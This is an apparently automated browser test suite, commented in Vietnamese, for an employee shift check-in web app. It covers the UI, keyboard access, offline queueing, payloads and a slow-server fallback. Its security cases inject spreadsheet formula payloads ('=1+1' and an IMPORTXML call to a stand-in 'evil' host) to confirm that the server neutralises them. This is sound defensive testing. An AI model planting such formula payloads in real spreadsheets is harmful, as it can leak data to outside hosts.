    T('US-2 thẻ chọn viền navy #1F3A5F', selBorder === 'rgb(31, 58, 95)', selBorder);
    T('US-2 app gọi navigator.vibrate(20) khi chọn thẻ (mã nguồn)', /vibrate\(20\)/.test(fs.readFileSync(path.join(APP, 'js', 'app.js'), 'utf8')));
    note('Rung 15–50 ms: headless không có motor; kiểm bằng mã nguồn app.js vibrate(20) có try/catch.');

    /* --- US-2 bàn phím: Tab tới thẻ, Enter/Space --- */
    await page.evaluate("document.getElementById('level-range').focus(); true");
    await page.key('Tab');
    await sleep(350); // .capy-card có transition: all .22s nên outline-color cũng chuyển dần
    let active = await page.evaluate("(() => { const a = document.activeElement; return { label: (a.querySelector && a.querySelector('.capy-label') || {}).textContent, fv: a.matches(':focus-visible'), outline: getComputedStyle(a).outlineStyle + ' ' + getComputedStyle(a).outlineWidth + ' ' + getComputedStyle(a).outlineColor }; })()");
    T('US-2 Tab từ thanh trượt → thẻ đầu "Vui vẻ" nhận focus, :focus-visible rõ (outline 3px cam)', active.label === 'Vui vẻ' && active.fv && active.outline === 'solid 3px rgb(233, 161, 91)', JSON.stringify(active));
    await page.key('Enter');
    cs = await cards(page);
    T('US-2 Enter chọn thẻ "Vui vẻ"', cs[0].pressed === 'true' && cs.filter(c => c.pressed === 'true').length === 1, JSON.stringify(cs.map(c => c.label + ':' + c.pressed)));
    await page.key('Tab');
    await page.key('Space');
    cs = await cards(page);
    T('US-2 Tab + Space chọn thẻ "Buồn", bỏ "Vui vẻ"', cs[1].pressed === 'true' && cs[0].pressed === 'false' && cs.filter(c => c.pressed === 'true').length === 1, JSON.stringify(cs.map(c => c.label + ':' + c.pressed)));
    const tabStops = await page.evaluate("[...document.querySelectorAll('#checkin button, #checkin input')].filter(e => !e.disabled && e.tabIndex >= 0).map(e => e.id || e.className.split(' ')[0]).join(',')");
    T('US-2 thứ tự Tab: ô mã → thanh trượt → 6 thẻ → nút', tabStops === 'employee-id,level-range,capy-card,capy-card,capy-card,capy-card,capy-card,capy-card,btn-submit', tabStops);

    /* --- US-3 hint "đủ" + nút thức dậy --- */
    await sleep(400);
    const hb = await page.evaluate("(() => { const h = document.getElementById('progress-hint'); const cs = getComputedStyle(h); return { text: h.textContent, done: h.classList.contains('done'), bg: cs.backgroundColor, color: cs.color }; })()");
    const b1 = await btn(page);
    T('US-3 đủ mã + thẻ → hint "đủ" đúng chữ, nền xanh lá nhạt', hb.text === TXT.done && hb.done && hb.bg === 'rgb(232, 245, 233)' && hb.color === 'rgb(46, 125, 50)', JSON.stringify(hb));
    T('US-3 nút sáng (opacity 1), phóng về 1, đập nhịp gentlePulse, không disabled', !b1.disabled && b1.ready && b1.opacity === '1' && (b1.transform === 'none' || b1.transform === 'matrix(1, 0, 0, 1, 0, 0)') && b1.anim === 'gentlePulse', JSON.stringify(b1));
    T('US-3 hint ưu tiên "thiếu mã" khi thiếu cả hai (đã chọn thẻ, xóa mã)', await (async () => { await clearId(page); const h = await hint(page); const ok = h === TXT.needId && (await btn(page)).disabled; await typeId(page, '1001'); await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('Hạnh')", 2500); return ok; })());

    /* --- US-3 hoàn thành: < 300 ms, hàng chờ localStorage, không alert, trang cám ơn --- */
    const nBefore = (await qa(page)).fetches.length;
    T('US-3 trước khi bấm: nút .ready và không disabled (điều kiện chờ, không chờ cố định)', !!(await waitReady(page)));
    await page.click('#btn-submit');
    await waitFor(page, "!document.getElementById('thanks').hidden", 2000);
    s = await qa(page);
    const dtSubmit = s.thanksShownAt - s.clickAt;
    T('US-3 bấm hoàn thành → sang trang cám ơn < 300 ms', s.thanksShownAt > 0 && dtSubmit >= 0 && dtSubmit < 300, dtSubmit.toFixed(1) + ' ms');
    T('US-3 card ẩn, #thanks hiện', (await q(page, '#checkin', 'hidden')) === true && (await q(page, '#thanks', 'hidden')) === false);
    T('US-3 không alert/confirm/prompt', s.alerts === 0, s.alerts);
    T('US-3 tiêu đề "Cám ơn anh/chị" và nhận focus', (await text(page, '#thanks-title')) === TXT.thanksTitle && (await page.evaluate("document.activeElement.id")) === 'thanks-title', await page.evaluate('document.activeElement.id'));
    T('US-3 câu chúc đúng A.7', (await text(page, '#thanks .page-lead')) === TXT.thanksLead, await text(page, '#thanks .page-lead'));
    T('US-3 tiêu đề hộp tóm tắt "Lượt vừa ghi", viền gạch đứt', (await text(page, '.summary-title')) === 'Lượt vừa ghi' && (await page.evaluate("getComputedStyle(document.querySelector('.success-summary')).borderStyle")) === 'dashed');
    T('US-3 tóm tắt "{Tên} · Mức {n} · {chữ} · {Cảm xúc}"', (await text(page, '#summary')) === 'Nguyễn Thị Hạnh · Mức 7 · Ổn · Buồn', await text(page, '#summary'));
    const tick = await page.evaluate("(() => { const c = document.querySelector('.checkmark-circle'), k = document.querySelector('.checkmark-check'), s = document.querySelector('.success-checkmark'); return { circle: getComputedStyle(c).animationName, check: getComputedStyle(k).animationName, still: s.classList.contains('still'), stroke: getComputedStyle(c).stroke }; })()");
    T('US-3 tick xanh vẽ dần (animation stroke, màu xanh lá)', tick.circle === 'stroke' && tick.check === 'stroke' && !tick.still && tick.stroke === 'rgb(67, 160, 71)', JSON.stringify(tick));
    const bAt = s.backupAtThanks;
    T('US-3 đúng lúc sang cám ơn (trước khi máy chủ trả lời): localStorage có đúng 1 bản sent:false, đủ 7 trường + sent', Array.isArray(bAt) && bAt.length === 1 && bAt[0].sent === false && bAt[0].employeeId === '1001' && bAt[0].emotion === 'Buồn' && Object.keys(bAt[0]).join(',') === PAYLOAD_KEYS + ',sent', JSON.stringify(bAt));
    const post = s.fetches.slice(nBefore).filter(f => f.method === 'POST');
    T('US-4 đúng 1 POST, Content-Type text/plain;charset=utf-8, keepalive', post.length === 1 && post[0].headers['Content-Type'] === 'text/plain;charset=utf-8' && post[0].keepalive === true && post[0].url === mock.url, JSON.stringify(post.map(p => ({ url: p.url, headers: p.headers, keepalive: p.keepalive }))));
    const payload = post.length ? JSON.parse(post[0].body) : {};
    T('US-4 payload đúng 7 trường đúng thứ tự', Object.keys(payload).join(',') === PAYLOAD_KEYS, Object.keys(payload).join(','));
    T('US-4 payload giá trị: 1001 / Nguyễn Thị Hạnh / 7 / Ổn / Buồn, created_at HH:mm:ss dd/MM/yyyy', payload.employeeId === '1001' && payload.name === 'Nguyễn Thị Hạnh' && payload.level === 7 && payload.levelText === 'Ổn' && payload.emotion === 'Buồn' && /^\d\d:\d\d:\d\d \d\d\/\d\d\/\d{4}$/.test(payload.created_at) && typeof payload.sessionId === 'string' && payload.sessionId.length >= 8 && payload.sessionId.length <= 40, JSON.stringify(payload));
    T('BM: sessionId app sinh (crypto.randomUUID) khớp khuôn server ^[0-9A-Za-z-]{8,40}$', SESSION_RE.test(payload.sessionId) && /^[0-9a-f-]{36}$/.test(payload.sessionId), payload.sessionId);
    const realPost = requests.find(r => r.method === 'POST' && r.url.startsWith('http://localhost:' + MOCK_PORT));
    T('US-4 header POST thật trên dây (Network): content-type text/plain, không preflight OPTIONS', !!realPost && /^text\/plain;charset=utf-8$/i.test(realPost.headers['Content-Type'] || realPost.headers['content-type'] || '') && !requests.some(r => r.method === 'OPTIONS'), realPost ? JSON.stringify(realPost.headers) : 'không thấy');
    T('US-4 mock trả success → bản sao bị XÓA khỏi hàng chờ, localStorage = []', !!(await backupEmpty(page)), JSON.stringify(await backup(page)));
    let rows = mock.rows();
    T('US-4 mock ghi đúng 1 dòng, 7 cột, name tra theo mã, employeeId chuẩn hóa, sessionId trùng payload', rows.length === 1 && Object.keys(rows[0]).join(',') === 'created_at,employeeId,name,level,levelText,emotion,sessionId' && rows[0].name === 'Nguyễn Thị Hạnh' && rows[0].employeeId === '1001' && rows[0].level === 7 && rows[0].sessionId === payload.sessionId, JSON.stringify(rows));
    T('US-4 mock log: inserted, không session_invalid', /inserted/.test(mock.log()) && !/session_invalid/.test(mock.log()), mock.log().split('\n').filter(l => /POST/.test(l)).join(' | '));
    await page.screenshot(path.join(OUT, 'shot-thanks-375.png'), true);

    /* --- US-3 Check-in cho ca khác --- */
    await page.click('[data-act="again"]');
    T('US-3 "Check-in cho ca khác" → về card', (await q(page, '#checkin', 'hidden')) === false && (await q(page, '#thanks', 'hidden')) === true);
    cs = await cards(page); lv = await level(page);
    T('US-3 thẻ bỏ chọn, thanh trượt về 5 (ảnh đổi ngay, không chờ debounce)', cs.every(c => c.pressed === 'false' && !c.selected && c.badge === 'none') && lv.value === '5' && lv.label === '5 · Bình thường' && lv.src === 'capy-level-05.png', JSON.stringify(lv));
    T('US-3 ô mã giữ nguyên "1001" và lời chào giữ', (await q(page, '#employee-id', 'value')) === '1001' && (await text(page, '#greet .greeting')) === 'Xin chào anh/chị Nguyễn Thị Hạnh', await greet(page));
    T('US-3 sau "ca khác": hint "thiếu thẻ", nút mờ, focus h1', (await hint(page)) === TXT.needCard && (await btn(page)).disabled && (await page.evaluate('document.activeElement.id')) === 'page-title');

    /* --- US-3 bấm hoàn thành 3 lần liên tiếp → 1 POST, 1 dòng; sessionId mới --- */
    T('US-3 chuẩn bị: chọn thẻ "Hoảng hốt"', await pickCard(page, 'panicked'));
    await waitReady(page);
    await page.evaluate("(() => { __qa.thanksShownAt = 0; __qa.clickAt = 0; __qa.backupAtThanks = null; const b = document.getElementById('btn-submit'); b.click(); b.click(); b.click(); return true; })()");
    await waitFor(page, "!document.getElementById('thanks').hidden", 2000);
    await backupEmpty(page);
    s = await qa(page);
    let bk = await backup(page);
    rows = mock.rows();
    const sids = posts(s).map(p => JSON.parse(p.body).sessionId);
    T('US-3 bấm đúp/ba → chỉ 1 POST thêm; hàng chờ 1 bản lúc sang cám ơn, rỗng sau success', sids.length === 2 && Array.isArray(s.backupAtThanks) && s.backupAtThanks.length === 1 && bk.length === 0, 'POST=' + sids.length + ' lúc cám ơn=' + JSON.stringify(s.backupAtThanks) + ' sau=' + bk.length);
    T('US-3 mock chỉ 2 dòng (không dòng đôi)', rows.length === 2, JSON.stringify(rows.map(r => r.emotion + '/' + r.sessionId)));
    T('US-3 sessionId mới khác lượt trước, dạng UUID, khớp khuôn server, trùng cột G mock', sids[1] !== sids[0] && /^[0-9a-f-]{36}$/.test(sids[1]) && sids.every(x => SESSION_RE.test(x)) && rows.map(r => r.sessionId).join(',') === sids.join(','), sids.join(' , '));
    T('US-3 tóm tắt lượt 2 "Nguyễn Thị Hạnh · Mức 5 · Bình thường · Hoảng hốt"', (await text(page, '#summary')) === 'Nguyễn Thị Hạnh · Mức 5 · Bình thường · Hoảng hốt', await text(page, '#summary'));
    note('Bấm đúp thật qua mạng với cùng sessionId → mock/Apps Script trả updated cùng row: kiểm ở test-mock-api.js và test-gas.js.');

    /* --- US-4 mã không tìm thấy → name rỗng, employeeId vẫn có; tóm tắt hiện mã --- */
    await page.click('[data-act="again"]');
    await typeId(page, '9999');
    await waitFor(page, "document.querySelector('#greet .greeting').textContent === 'Xin chào anh/chị'", 2500);
    T('US-3 chuẩn bị: chọn thẻ "Vui vẻ"', await pickCard(page, 'happy'));
    T('US-1 mã 9999 không tìm thấy + chọn thẻ → nút vẫn thức dậy', !(await btn(page)).disabled && (await hint(page)) === TXT.done);
    T('US-3 9999: sang trang cám ơn', await submit(page));
    await backupEmpty(page);
    s = await qa(page);
    const p3 = lastPostBody(s);
    rows = mock.rows();
    T('US-4 mã không tìm thấy → payload name rỗng, employeeId "9999"', p3.name === '' && p3.employeeId === '9999', JSON.stringify(p3));
    T('US-4 mock dòng 3: Tên rỗng, Mã 9999', rows.length === 3 && rows[2].name === '' && rows[2].employeeId === '9999', JSON.stringify(rows[2]));
    T('US-3 tóm tắt dùng mã khi không có tên: "9999 · Mức 5 · Bình thường · Vui vẻ"', (await text(page, '#summary')) === '9999 · Mức 5 · Bình thường · Vui vẻ', await text(page, '#summary'));

    /* --- Biên: trần 20 bản sao localStorage, không đẩy history (nút back thoát trang, không kẹt) --- */
    await page.click('[data-act="again"]');
    await page.evaluate("localStorage.setItem('checkin_vao_ca_backup', JSON.stringify(Array.from({ length: 25 }, (_, i) => ({ sessionId: 'old-' + i, sent: true })))); __qa.thanksShownAt = 0; __qa.backupAtThanks = null; true");
    T('US-3 chuẩn bị: chọn thẻ "Buồn"', await pickCard(page, 'sad'));
    T('Biên 25 cũ: sang trang cám ơn', await submit(page));
    s = await qa(page);
    const b25 = s.backupAtThanks;
    T('Biên: 25 bản cũ + 1 mới → lúc sang cám ơn giữ tối đa 20, bản mới ở cuối, cũ nhất còn lại old-6', Array.isArray(b25) && b25.length === 20 && b25[19].emotion === 'Buồn' && b25[19].sent === false && b25[0].sessionId === 'old-6', (b25 && b25.length) + ' / cuối: ' + JSON.stringify(b25 && b25[19]));
    await waitFor(page, "JSON.parse(localStorage.getItem('checkin_vao_ca_backup') || '[]').length === 19", 2500);
    bk = await backup(page);
    T('Biên: mock trả success → chỉ bản mới bị xóa, còn 19 bản cũ (dọn sent:true để dành lúc tải trang)', bk.length === 19 && bk[0].sessionId === 'old-6' && bk[18].sessionId === 'old-24' && !bk.some(x => x.emotion === 'Buồn'), bk.length + ' / ' + JSON.stringify(bk.slice(0, 2)));
    T('Biên: app không đẩy history (back = rời trang, không kẹt), không hash', (await page.evaluate('history.length')) === histBase && (await page.evaluate('location.hash')) === '', 'history.length ' + histBase + ' → ' + (await page.evaluate('history.length')));
    T('Biên: localStorage hỏng (JSON lỗi) → vẫn sang cám ơn, ghi bản mới rồi xóa khi success, không lỗi', await (async () => { await page.click('[data-act="again"]'); await page.evaluate("localStorage.setItem('checkin_vao_ca_backup', '{oops'); __qa.thanksShownAt = 0; __qa.backupAtThanks = null; true"); if (!(await pickCard(page, 'happy'))) return false; if (!(await submit(page))) return false; const st = await qa(page); const at = st.backupAtThanks; const emptied = !!(await backupEmpty(page)); return Array.isArray(at) && at.length === 1 && at[0].emotion === 'Vui vẻ' && emptied && st.errors.length === 0; })(), JSON.stringify((await qa(page)).backupAtThanks));

    /* --- US-4 minh bạch, chân trang --- */
    T('US-4 dòng minh bạch ngay trên nút hoàn thành', (await page.evaluate("(() => { const t = document.querySelector('#checkin .transparency-line'); const b = document.getElementById('btn-submit'); return t && t.textContent === 'Dữ liệu dùng để chăm sóc nhân viên, chỉ người phụ trách xem.' && (t.compareDocumentPosition(b) & Node.DOCUMENT_POSITION_FOLLOWING) > 0; })()")));
    T('US-4 chân trang "Tự đánh giá, không phải thang chẩn đoán." ở cả 2 màn', (await page.evaluate("[...document.querySelectorAll('.footer-note')].map(e => e.textContent)")).join('|') === 'Tự đánh giá, không phải thang chẩn đoán.|Tự đánh giá, không phải thang chẩn đoán.');
    const pub = await (await fetch(mock.url)).json();
    T('US-4 mock GET không action → public_read_disabled', pub.error === 'public_read_disabled', JSON.stringify(pub));

    /* --- Giọng viết trên trang thật --- */
    const voice = await page.evaluate("(() => { const t = (document.getElementById('checkin').innerText + ' ' + document.getElementById('thanks').innerText).replace(/anh\\/chị/gi, ''); const m = t.match(/(^|[^\\p{L}])(bạn|chị|em|mẹ)(?![\\p{L}])/giu); return m ? m.map(x => x.trim()).join(',') : ''; })()");
    T('Giọng: không lẫn "bạn"/"chị"/"em" lẻ trên trang', voice === '', voice);
    const medical = await page.evaluate("(() => { const t = (document.getElementById('checkin').innerText + ' ' + document.getElementById('thanks').innerText).toLowerCase(); return ['bệnh nhân','triệu chứng','trầm cảm','lo âu','stress','điều trị','sàng lọc','rối loạn','burnout','tâm thần'].filter(w => t.includes(w)).join(','); })()");
    T('Giọng: không từ y khoa trên trang (trừ câu chân trang PRD bắt buộc)', medical === '', medical);

    /* --- Console sạch ở luồng bình thường (trước các ca ép lỗi bên dưới) --- */
    s = await qa(page);
    T('Console: không console.error / lỗi JS / promise rơi', s.errors.length === 0, JSON.stringify(s.errors));
    T('Console: không console.warn ở luồng bình thường', s.warns.length === 0, JSON.stringify(s.warns));
    const browserErrors = browserLog.filter(l => l.startsWith('error'));
    T('Console trình duyệt: không lỗi (CORS/404/…)', browserErrors.length === 0, JSON.stringify(browserErrors));
    fs.writeFileSync(path.join(OUT, 'console-main.txt'), ['--- Runtime.consoleAPICalled ---'].concat(consoleApi, ['--- Log.entryAdded ---'], browserLog, ['--- __qa.warns ---'], s.warns, ['--- __qa.errors ---'], s.errors).join('\n'));

    /* ===== Lần 2: tải lại trang → resendPending dọn bản cũ sent:true (kiểu bản cũ của app), không gửi gì ===== */
    const oldSent = Array.from({ length: 19 }, (_, i) => ({ created_at: '', sessionId: 'old-sent-' + i, employeeId: '1001', name: '', level: 5, levelText: 'Bình thường', emotion: 'Vui vẻ', sent: true }));
    await page.evaluate("localStorage.setItem('checkin_vao_ca_backup', " + JSON.stringify(JSON.stringify(oldSent)) + "); true");
    await page.navigate(APP_URL);
    await sleep(500);
    s = await qa(page);
    T('P1 tải lại trang với 19 bản cũ sent:true (kiểu bản cũ) → dọn sạch, localStorage [], không POST, không warn', (await backup(page)).length === 0 && posts(s).length === 0 && s.warns.length === 0 && s.errors.length === 0, JSON.stringify({ bk: await backup(page), posts: posts(s).length, warns: s.warns, errors: s.errors }));

    /* ===== Lần 2 – Bảo mật end-to-end qua mock thật =====
       (a) emotion ngoài 6 nhãn: đổi nhãn thẻ trong APP_DATA trước khi chọn → payload emotion '=1+1' → mock trả emotion_invalid */
    await typeId(page, '1001');
    await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('Hạnh')", 2500);
    await page.evaluate("window.APP_DATA.EMOTIONS[0].label = '=1+1'; true");
    T('BM chuẩn bị: chọn thẻ đầu (nhãn đã đổi thành "=1+1")', await pickCard(page, 'happy'));
    const rowsBeforeInj = mock.rows().length;
    T('BM emotion "=1+1": vẫn sang trang cám ơn ngay (không chặn người dùng)', await submit(page));
    const warned = await waitFor(page, "__qa.warns.some(w => w.includes('emotion_invalid'))", 2500);
    s = await qa(page);
    bk = await backup(page);
    T('BM emotion "=1+1": POST đi thật, mock thật trả error emotion_invalid (log mock)', lastPostBody(s).emotion === '=1+1' && /error=emotion_invalid/.test(mock.log()), mock.log().split('\n').filter(l => /POST/.test(l)).pop());
    T('BM emotion "=1+1": console.warn đúng chữ "checkin: máy chủ không nhận (emotion_invalid), đã giữ bản sao localStorage"', !!warned && s.warns.includes(TXT.rejected('emotion_invalid')), JSON.stringify(s.warns));
    T('BM emotion "=1+1": bản sao GIỮ trong localStorage sent:false, mock không thêm dòng', bk.length === 1 && bk[0].sent === false && bk[0].emotion === '=1+1' && mock.rows().length === rowsBeforeInj, JSON.stringify(bk));
    T('BM emotion "=1+1": không console.error, tóm tắt hiện dạng chữ thường (esc)', s.errors.length === 0 && (await text(page, '#summary')) === 'Nguyễn Thị Hạnh · Mức 5 · Bình thường · =1+1', await text(page, '#summary'));
    await page.evaluate("window.APP_DATA.EMOTIONS[0].label = 'Vui vẻ'; true");
    /* bản bị từ chối: tải lại trang → gửi lại im lặng → mock vẫn từ chối → vẫn giữ, KHÔNG warn */
    await page.navigate(APP_URL);
    await sleep(600);
    s = await qa(page);
    bk = await backup(page);
    T('P1 gửi lại bản bị từ chối: 1 POST im lặng, mock lại từ chối, bản vẫn giữ, không console.warn', posts(s).length === 1 && bk.length === 1 && bk[0].emotion === '=1+1' && s.warns.length === 0 && s.errors.length === 0, JSON.stringify({ posts: posts(s).length, bk: bk.length, warns: s.warns }));
    note('Bản bị máy chủ từ chối (emotion_invalid) nằm lại hàng chờ vô thời hạn và được gửi lại mỗi lần tải trang; chỉ bị đẩy ra khi quá BACKUP_MAX. Ghi nhận mức Gợi ý.');
    await page.evaluate("localStorage.removeItem('checkin_vao_ca_backup'); true");

    /* (b) name client "=IMPORTXML(...)" (stub lookup trả tên bẩn) → cột Tên mock vẫn tra từ danh sách theo mã */
    await page.evaluate("__qa.stub = 'id=1001'; __qa.stubBody = { result: 'success', found: true, name: '=IMPORTXML(\"http://evil\";\"//a\")' }; true");
    await clearId(page);
    await typeId(page, '1001');
    await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('IMPORTXML')", 2500);
    T('BM name bẩn: lời chào hiện tên bẩn dạng chữ thường (esc), không sinh phần tử con', (await text(page, '#greet .greeting')) === 'Xin chào anh/chị =IMPORTXML("http://evil";"//a")' && (await page.evaluate("document.querySelector('#greet .greeting').children.length")) === 0, await q(page, '#greet .greeting', 'innerHTML'));
    T('BM chuẩn bị: chọn thẻ "Buồn"', await pickCard(page, 'sad'));
    T('BM name bẩn: sang trang cám ơn', await submit(page));
    T('BM name bẩn: mock trả success → hàng chờ rỗng', !!(await backupEmpty(page)));
    s = await qa(page);
    rows = mock.rows();
    const injRow = rows[rows.length - 1];
    T('BM name bẩn: payload gửi name "=IMPORTXML(...)" nhưng dòng mock Tên = "Nguyễn Thị Hạnh" (tra theo mã 1001, bỏ name client)', lastPostBody(s).name.startsWith('=IMPORTXML') && injRow && injRow.employeeId === '1001' && injRow.name === 'Nguyễn Thị Hạnh' && injRow.emotion === 'Buồn', JSON.stringify(injRow));
    T('BM: không ô chuỗi nào trong dữ liệu mock bắt đầu bằng = + - @', rows.every(r => Object.values(r).every(v => typeof v !== 'string' || !/^[=+\-@\t\r]/.test(v))), JSON.stringify(rows.map(r => r.name + '/' + r.emotion)));
    await page.evaluate('__qa.stub = null; true');

    /* (c) sessionId dự phòng khi WebView không có crypto.randomUUID → vẫn khớp khuôn server */
    const noUuid = await page.send('Page.addScriptToEvaluateOnNewDocument', { source: "Object.defineProperty(Crypto.prototype, 'randomUUID', { value: undefined, configurable: true });" });
    await page.navigate(APP_URL);
    T('BM sessionId dự phòng: trang tải lại không có crypto.randomUUID', (await page.evaluate("typeof crypto.randomUUID")) === 'undefined');
    await typeId(page, '1001');
    await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('Hạnh')", 2500);
    T('BM chuẩn bị: chọn thẻ "Tức giận"', await pickCard(page, 'angry'));
    T('BM sessionId dự phòng: sang trang cám ơn', await submit(page));
    T('BM sessionId dự phòng: mock trả success → hàng chờ rỗng', !!(await backupEmpty(page)));
    s = await qa(page);
    const sidFb = lastPostBody(s).sessionId;
    rows = mock.rows();
    T('BM sessionId dự phòng dạng base36-base36, khớp ^[0-9A-Za-z-]{8,40}$, mock inserted (không session_invalid)', typeof sidFb === 'string' && /^[0-9a-z]+-[0-9a-z]+$/.test(sidFb) && SESSION_RE.test(sidFb) && rows[rows.length - 1].sessionId === sidFb && !/session_invalid/.test(mock.log()), sidFb);
    await page.send('Page.removeScriptToEvaluateOnNewDocument', { identifier: noUuid.identifier });
    s = await qa(page);
    T('Console sau các ca bảo mật: không console.error', s.errors.length === 0, JSON.stringify(s.errors));
  } finally {
    if (kill) kill(); if (srv) await srv.close(); if (mock) await mock.stop();
  }
}

/* ================= KỊCH BẢN slow: mock --slow 2 s → timeout 1,5 s ================= */
async function scenarioSlow() {
  let mock = null, srv = null, kill = null, browserLog = [], consoleApi = [], requests = [];
  let page;
  try {
    mock = await startMock(true);
    srv = await startStatic({ port: STATIC_PORT, appDir: APP, mockUrl: mock.url });
    ({ page, kill, browserLog, requests } = await openApp({}));
    const hIdle = await page.evaluate("document.getElementById('greet').getBoundingClientRect().height");
    await typeId(page, '1001');
    await sleep(600);
    const hSearch = await page.evaluate("document.getElementById('greet').getBoundingClientRect().height");
    note('Chiều cao #greet: trống ' + hIdle + ' px → "Đang tìm…" ' + hSearch + ' px (nhảy layout ' + (hSearch - hIdle) + ' px).');
    const st = await page.evaluate("(() => { const e = document.querySelector('#greet .lookup-state'); const cs = getComputedStyle(e); return { text: e.textContent, cls: e.className, opacity: cs.opacity, italic: cs.fontStyle }; })()");
    T('US-1 slow: 600 ms sau khi gõ → "Đang tìm…" mờ (opacity .7, nghiêng)', st.text === TXT.searching && st.cls.includes('searching') && st.opacity === '0.7' && st.italic === 'italic', JSON.stringify(st));
    await sleep(700);
    T('US-1 slow: 1300 ms vẫn "Đang tìm…"', (await text(page, '#greet .lookup-state')) === TXT.searching, await greet(page));
    await waitFor(page, "document.querySelector('#greet .lookup-state').textContent.startsWith('Mình chưa')", 2500);
    let s = await qa(page);
    const searchEntry = s.greet.find(g => g.text.startsWith(TXT.searching));
    const nfEntry = s.greet.find(g => g.text.startsWith(TXT.notFound));
    const dt = searchEntry && nfEntry ? nfEntry.t - searchEntry.t : -1;
    const hNf = await page.evaluate("document.getElementById('greet').getBoundingClientRect().height");
    note('Chiều cao #greet khi "không tìm thấy" + lời chào chung: ' + hNf + ' px.');
    T('US-1 slow: quá 1,5 s → xử lý như không tìm thấy (đúng chữ + "Xin chào anh/chị")', (await text(page, '#greet .lookup-state')) === TXT.notFound && (await text(page, '#greet .greeting')) === TXT.hello, await greet(page));
    T('US-1 slow: thời gian từ "Đang tìm…" đến bỏ cuộc ≈ 1500 ms (1400–1800)', dt >= 1400 && dt <= 1800, dt.toFixed(0) + ' ms');
    T('US-1 slow: chỉ console.warn, không console.error, không đỏ', s.errors.length === 0 && s.warns.some(w => /dò tên thất bại \(AbortError\)/.test(w)) && (await noRed(page)) === '', JSON.stringify({ warns: s.warns, errors: s.errors }));
    /* blur → dò lại */
    await page.evaluate("document.getElementById('employee-id').focus(); true");
    await page.key('Tab');
    await sleep(80);
    T('US-1 slow: rời ô (blur) sau timeout → dò lại ngay "Đang tìm…"', (await text(page, '#greet .lookup-state')) === TXT.searching, await greet(page));
    await sleep(2300);
    T('US-1 slow: lần dò lại cũng bỏ cuộc mềm, không lỗi', (await text(page, '#greet .lookup-state')) === TXT.notFound && (await qa(page)).errors.length === 0, await greet(page));

    /* --- JSONP quá giờ: ép fetch ném TypeError → app rẽ sang JSONP tới mock --slow (trả sau 2 s > 1,5 s còn lại)
       → quá giờ: giữ hàm callback rỗng 5 s để script về muộn không gây ReferenceError, rồi mới xóa --- */
    await page.evaluate("__qa.fetchThrow = 'id=1002'; true");
    await typeId(page, '1002');
    await waitFor(page, "document.querySelector('#greet .lookup-state').textContent.startsWith('Mình chưa')", 3500);
    s = await qa(page);
    const lateFn = await page.evaluate("Object.keys(window).filter(k => k.startsWith('__capyLookup')).map(k => k + ':' + typeof window[k]).join(',')");
    const tLate = Date.now();
    T('US-1 slow/JSONP: fetch TypeError → JSONP; quá giờ → không tìm thấy mềm, warn "JSONP dò tên quá giờ"', (await text(page, '#greet .lookup-state')) === TXT.notFound && s.warns.some(w => /JSONP dò tên quá giờ/.test(w)) && s.errors.length === 0, JSON.stringify(s.warns.slice(-2)));
    T('US-1 slow/JSONP: trình duyệt đã gửi <script> JSONP ?action=lookup&id=1002&callback=__capyLookupN tới mock', requests.some(r => /action=lookup&id=1002&callback=__capyLookup\d+$/.test(r.url)), requests.filter(r => /callback/.test(r.url)).map(r => r.url).join(' '));
    T('US-1 slow/JSONP: ngay sau quá giờ, hàm callback còn là hàm rỗng (chờ script về muộn), <script> đã gỡ', /__capyLookup\d+:function/.test(lateFn) && (await page.evaluate("document.querySelectorAll('script[src*=callback]').length")) === 0, lateFn);
    await sleep(1300); // script về muộn ở ~2 s sau khi gắn → gọi hàm rỗng
    s = await qa(page);
    T('US-1 slow/JSONP: mock --slow đã trả JSONP về muộn (log mock có callback=__capyLookup)', /callback=__capyLookup\d+ → found=true/.test(mock.log()), mock.log().split('\n').filter(l => /callback/.test(l)).join(' | '));
    T('US-1 slow/JSONP: script về muộn gọi hàm rỗng → không ReferenceError, không console.error, kết quả muộn không ghi đè', s.errors.length === 0 && !browserLog.some(l => /ReferenceError|is not a function/.test(l)) && (await text(page, '#greet .greeting')) === TXT.hello && (await text(page, '#greet .lookup-state')) === TXT.notFound, JSON.stringify({ errors: s.errors, browser: browserLog.filter(l => /Error/.test(l)) }));
    const gone = await waitFor(page, "Object.keys(window).filter(k => k.startsWith('__capyLookup')).length === 0", 6000);
    T('US-1 slow/JSONP: sau ~5 s hàm rỗng được xóa khỏi window', !!gone, 'sau ' + (Date.now() - tLate) + ' ms kể từ quá giờ');
    await page.evaluate("__qa.fetchThrow = null; true");

    /* submit khi POST trễ 2 s → vẫn sang cám ơn ngay; bản sao nằm chờ sent:false rồi bị xóa khi mock trả về */
    T('US-3 slow chuẩn bị: chọn thẻ "Tức giận"', await pickCard(page, 'angry'));
    T('US-3 slow: nút sẵn sàng rồi mới bấm', !!(await waitReady(page)));
    await page.click('#btn-submit');
    await waitFor(page, "!document.getElementById('thanks').hidden", 2000);
    s = await qa(page);
    const dtSubmit = s.thanksShownAt - s.clickAt;
    T('US-3 slow: POST trễ 2 s vẫn sang cám ơn < 300 ms', s.thanksShownAt > 0 && dtSubmit < 300, dtSubmit.toFixed(1) + ' ms');
    T('US-3 slow: tóm tắt dùng mã vì chưa dò được tên', (await text(page, '#summary')) === '1002 · Mức 5 · Bình thường · Tức giận', await text(page, '#summary'));
    let bk = await backup(page);
    T('US-3 slow: bản sao sent:false nằm chờ trong lúc máy chủ chưa trả lời', bk.length === 1 && bk[0].sent === false && bk[0].name === '' && bk[0].employeeId === '1002', JSON.stringify(bk[0]));
    await sleep(1200);
    T('US-3 slow: 1,2 s sau vẫn còn bản chờ (mock chưa trả)', (await backup(page)).length === 1);
    const emptied = await waitFor(page, "localStorage.getItem('checkin_vao_ca_backup') === '[]'", 2500);
    T('US-3 slow: mock trả success sau ~2 s → bản sao bị xóa, localStorage [], mock 1 dòng', !!emptied && mock.rows().length === 1 && mock.rows()[0].employeeId === '1002', JSON.stringify({ bk: await backup(page), rows: mock.rows().length }));
    s = await qa(page);
    T('Console slow: không console.error, không warn "gửi thất bại"', s.errors.length === 0 && !s.warns.some(w => /gửi thất bại|máy chủ không nhận/.test(w)), JSON.stringify(s.errors));
    fs.writeFileSync(path.join(OUT, 'console-slow.txt'), ['--- warns ---'].concat(s.warns, ['--- errors ---'], s.errors, ['--- browser ---'], browserLog).join('\n'));
  } finally {
